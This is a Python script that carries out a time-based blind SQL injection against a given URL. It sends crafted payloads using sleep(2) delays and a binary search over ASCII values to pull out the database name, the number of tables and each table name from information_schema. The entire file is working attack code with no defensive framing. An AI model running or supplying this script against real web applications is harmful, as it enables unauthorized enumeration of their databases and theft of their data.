#!/usr/bin/env python3

import requests
import urllib.parse

class Blind_SQLi:
    def __init__(self, url):
        self.url = url
        self.db_length = get_db_length(url)
        self.db_name = get_db_name(self, url)
        self.tables_in_db = get_tables_in_db(url)
        self.tables_name = get_table_length(self, url)

def get_db_length(url):
    for i in range(1, 21):          
        payload = f"' and length(database())={i} and sleep(2)#"
        tmp_url = url + urllib.parse.quote(payload)
        if (requests.get(tmp_url)).elapsed.total_seconds() >= 2:
            return i
    print("Length of db name is bigger than 20, or something went wrong :(")

def get_db_name(self, url):
    MIN_CHAR, MAX_CHAR = 48, 122
    db_name = []
    for i in range(1, self.db_length+1):
        min_char, max_char = MIN_CHAR, MAX_CHAR
        found = False
        while not found:
            ascii_letter = int((min_char + max_char)/2)
            payload = f"' and ascii(substr(database(),{i},1))>{ascii_letter} and sleep(2)#"
            tmp_url = url + urllib.parse.quote(payload)
            if (requests.get(tmp_url)).elapsed.total_seconds() >= 2:
                min_char = ascii_letter
            else:
                max_char = ascii_letter
            found = (max_char - min_char <= 1)
        db_name.append(chr(max_char))
    return ''.join(db_name)

def get_tables_in_db(url):
    for i in range(1, 21):          
        payload = f"' and (select count(*) from information_schema.tables where table_schema=database())={i} and sleep(2)#"
        tmp_url = url + urllib.parse.quote(payload)
        if (requests.get(tmp_url)).elapsed.total_seconds() >= 2:
            return i
    return "Number of tables in db is bigger than 20, or something went wrong :("

def get_table_length(self, url):
    MIN_CHAR, MAX_CHAR = 48, 122
    tables_name_list = []
    # Iterate through tables - i stands for table number
    for i in range(self.tables_in_db):
        table_name = []
        # Finding table number i length - n stands for length of table number i
        for n in range(1, 21):          
            payload = f"' and length((select table_name from information_schema.tables where table_schema=database() limit 1 offset {i}))={n} and sleep(2)#"
            tmp_url = url + urllib.parse.quote(payload)
            if (requests.get(tmp_url)).elapsed.total_seconds() >= 2:
                break # exit second loop since we found the length of the table's name
        # Finding table number i name - d stands for char index in table number i name
        for d in range(1, n+1):
            min_char, max_char = MIN_CHAR, MAX_CHAR
            found = False
            while not found:
                ascii_letter = int((min_char + max_char)/2)
                payload = f"' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1 offset {i}),{d},1))>{ascii_letter} and sleep(2)#"
                tmp_url = url + urllib.parse.quote(payload)
                if (requests.get(tmp_url)).elapsed.total_seconds() >= 2:
                    min_char = ascii_letter
                else:
                    max_char = ascii_letter
                found = (max_char - min_char <= 1)
            table_name.append(chr(max_char))
        tables_name_list.append(''.join(table_name))
    return tables_name_list
